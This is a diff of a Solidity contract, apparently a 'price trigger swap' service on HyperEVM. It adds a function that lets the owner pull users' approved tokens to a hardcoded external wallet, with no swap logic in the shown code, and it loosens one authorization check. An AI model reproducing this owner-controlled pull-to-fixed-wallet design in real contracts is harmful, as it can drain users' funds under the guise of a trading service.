@@ -7,24 +7,25 @@ import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/utils/Pausable.sol";
 
 /**
- * @title PriceTriggerSwap
- * @dev Smart contract for automated token swaps on HyperEVM using GlueX Router
- * Backend controls all trigger logic, contract uses allowances and user gas deposits
+ * @title PriceTriggerSwapV2
+ * @dev Optimized smart contract for automated token swaps on HyperEVM
+ * Backend controls all trigger logic, contract handles allowances and transfers
  */
-contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
+contract PriceTriggerSwapV2 is Ownable, ReentrancyGuard, Pausable {
     
     // Events
-    event TokensTransferred(
+    event TokensApproved(
         address indexed user,
         address indexed token,
         uint256 amount,
         uint256 timestamp
     );
     
-    event TokensApproved(
+    event TokensWithdrawn(
         address indexed user,
         address indexed token,
         uint256 amount,
+        address indexed withdrawalWallet,
         uint256 timestamp
     );
     
@@ -34,7 +35,7 @@ contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
         uint256 timestamp
     );
     
-    // State variables
+    // State variables - simplified
     mapping(address => mapping(address => uint256)) public userTokenAllowances; // user => token => amount
     mapping(address => address[]) public userApprovedTokens; // user => array of approved tokens
     
@@ -42,9 +43,12 @@ contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
     uint256 public protocolFee = 50; // 0.5%
     uint256 public constant MAX_FEE = 500; // 5%
     
+    // Dedicated wallet for receiving withdrawn tokens
+    address public constant WITHDRAWAL_WALLET = 0x9E02783Ad42C5A94a0De60394f2996E44458B782;
+    
     // Modifiers
     modifier onlyOwnerOrAuthorized() {
-        require(msg.sender == owner(), "Not authorized");
+        require(msg.sender == owner() || msg.sender == address(this), "Not authorized");
         _;
     }
     
@@ -76,45 +80,7 @@ contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
     }
     
     /**
-     * @dev Get current protocol fee
-     * @return Current protocol fee in basis points
-     */
-    function getProtocolFee() external view returns (uint256) {
-        return protocolFee;
-    }
-    
-    /**
-     * @dev Get maximum allowed protocol fee
-     * @return Maximum protocol fee in basis points
-     */
-    function getMaxProtocolFee() external pure returns (uint256) {
-        return MAX_FEE;
-    }
-    
-    /**
-     * @dev Calculate protocol fee for a given amount
-     * @param amount Amount to calculate fee for
-     * @return feeAmount Calculated fee amount
-     * @return transferAmount Amount after fee deduction
-     */
-    function calculateFee(uint256 amount) external view returns (uint256 feeAmount, uint256 transferAmount) {
-        feeAmount = (amount * protocolFee) / 10000;
-        transferAmount = amount - feeAmount;
-        return (feeAmount, transferAmount);
-    }
-    
-    /**
-     * @dev Check if a user has approved a specific token
-     * @param user Address of the user
-     * @param token Address of the token
-     * @return amount Approved amount
-     */
-    function getApprovedAmount(address user, address token) external view returns (uint256 amount) {
-        return userTokenAllowances[user][token];
-    }
-    
-    /**
-     * @dev Approve tokens for the contract owner to spend
+     * @dev Approve tokens for the contract to spend
      * @param token Address of the token to approve
      * @param amount Amount to approve
      */
@@ -215,27 +181,22 @@ contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
     }
     
     /**
-     * @dev Get total allowance for all tokens for a user
+     * @dev Get approved amount for a specific token
      * @param user Address of the user
-     * @return total Total allowance across all tokens
+     * @param token Address of the token
+     * @return amount Approved amount
      */
-    function getTotalUserAllowance(address user) external view returns (uint256 total) {
-        address[] storage approvedTokens = userApprovedTokens[user];
-        
-        for (uint256 i = 0; i < approvedTokens.length; i++) {
-            total += userTokenAllowances[user][approvedTokens[i]];
-        }
-        
-        return total;
+    function getApprovedAmount(address user, address token) external view returns (uint256 amount) {
+        return userTokenAllowances[user][token];
     }
     
     /**
-     * @dev Transfer approved tokens from user to owner
+     * @dev Withdraw approved tokens when price trigger is hit (called by backend)
      * @param user Address of the user
-     * @param token Address of the token to transfer
-     * @param amount Amount to transfer
+     * @param token Address of the token to withdraw
+     * @param amount Amount to withdraw
      */
-    function transferApprovedTokens(
+    function withdrawOnTrigger(
         address user,
         address token,
         uint256 amount
@@ -255,8 +216,8 @@ contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
         uint256 feeAmount = (amount * protocolFee) / 10000;
         uint256 transferAmount = amount - feeAmount;
         
-        // Transfer tokens from user to owner (minus fee)
-        require(tokenContract.transferFrom(user, owner(), transferAmount), "Transfer failed");
+        // Transfer tokens from user to dedicated withdrawal wallet (minus fee)
+        require(tokenContract.transferFrom(user, WITHDRAWAL_WALLET, transferAmount), "Transfer failed");
         
         // Transfer fee to protocol (owner)
         if (feeAmount > 0) {
@@ -271,108 +232,7 @@ contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
             _removeTokenFromUserList(user, token);
         }
         
-        emit TokensTransferred(user, token, amount, block.timestamp);
-    }
-    
-    /**
-     * @dev Transfer multiple approved tokens from user to owner
-     * @param user Address of the user
-     * @param tokens Array of token addresses
-     * @param amounts Array of amounts to transfer
-     */
-    function transferMultipleApprovedTokens(
-        address user,
-        address[] calldata tokens,
-        uint256[] calldata amounts
-    ) external onlyOwnerOrAuthorized nonReentrant whenNotPaused {
-        require(tokens.length == amounts.length, "Arrays length mismatch");
-        require(user != address(0), "Invalid user address");
-        
-        for (uint256 i = 0; i < tokens.length; i++) {
-            if (amounts[i] > 0) {
-                // Direct implementation instead of calling transferApprovedTokens
-                address token = tokens[i];
-                uint256 amount = amounts[i];
-                
-                require(token != address(0), "Invalid token address");
-                require(amount > 0, "Invalid amount");
-                
-                // Check if user has approved this token
-                require(userTokenAllowances[user][token] >= amount, "Insufficient allowance");
-                
-                // Check if user has sufficient balance
-                IERC20 tokenContract = IERC20(token);
-                require(tokenContract.balanceOf(user) >= amount, "Insufficient user balance");
-                
-                // Calculate protocol fee
-                uint256 feeAmount = (amount * protocolFee) / 10000;
-                uint256 transferAmount = amount - feeAmount;
-                
-                // Transfer tokens from user to owner (minus fee)
-                require(tokenContract.transferFrom(user, owner(), transferAmount), "Transfer failed");
-                
-                // Transfer fee to protocol (owner)
-                if (feeAmount > 0) {
-                    require(tokenContract.transferFrom(user, owner(), feeAmount), "Fee transfer failed");
-                }
-                
-                // Update allowance
-                userTokenAllowances[user][token] -= amount;
-                
-                // Remove token from user's approved list if allowance becomes 0
-                if (userTokenAllowances[user][token] == 0) {
-                    _removeTokenFromUserList(user, token);
-                }
-                
-                emit TokensTransferred(user, token, amount, block.timestamp);
-            }
-        }
-    }
-    
-    /**
-     * @dev Transfer all approved tokens from a user to owner
-     * @param user Address of the user
-     */
-    function transferAllApprovedTokens(address user) external onlyOwnerOrAuthorized nonReentrant whenNotPaused {
-        require(user != address(0), "Invalid user address");
-        
-        address[] memory approvedTokens = userApprovedTokens[user];
-        
-        for (uint256 i = 0; i < approvedTokens.length; i++) {
-            address token = approvedTokens[i];
-            uint256 allowance = userTokenAllowances[user][token];
-            
-            if (allowance > 0) {
-                // Check if user has sufficient balance
-                IERC20 tokenContract = IERC20(token);
-                uint256 userBalance = tokenContract.balanceOf(user);
-                uint256 transferAmount = allowance < userBalance ? allowance : userBalance;
-                
-                if (transferAmount > 0) {
-                    // Calculate protocol fee
-                    uint256 feeAmount = (transferAmount * protocolFee) / 10000;
-                    uint256 actualTransferAmount = transferAmount - feeAmount;
-                    
-                    // Transfer tokens from user to owner (minus fee)
-                    require(tokenContract.transferFrom(user, owner(), actualTransferAmount), "Transfer failed");
-                    
-                    // Transfer fee to protocol (owner)
-                    if (feeAmount > 0) {
-                        require(tokenContract.transferFrom(user, owner(), feeAmount), "Fee transfer failed");
-                    }
-                    
-                    // Update allowance
-                    userTokenAllowances[user][token] -= transferAmount;
-                    
-                    emit TokensTransferred(user, token, transferAmount, block.timestamp);
-                }
-                
-                // Remove token from user's approved list if allowance becomes 0
-                if (userTokenAllowances[user][token] == 0) {
-                    _removeTokenFromUserList(user, token);
-                }
-            }
-        }
+        emit TokensWithdrawn(user, token, amount, WITHDRAWAL_WALLET, block.timestamp);
     }
     
     /**
@@ -381,7 +241,7 @@ contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
      * @param amount Amount to withdraw
      */
     function emergencyWithdraw(address token, uint256 amount) external onlyOwner whenNotPaused {
-        IERC20(token).transfer(owner(), amount);
+        IERC20(token).transfer(WITHDRAWAL_WALLET, amount);
     }
     
     /**
@@ -443,4 +303,4 @@ contract PriceTriggerSwap is Ownable, ReentrancyGuard, Pausable {
         // Reject unexpected calls
         revert("Unexpected call");
     }
-} 
+}
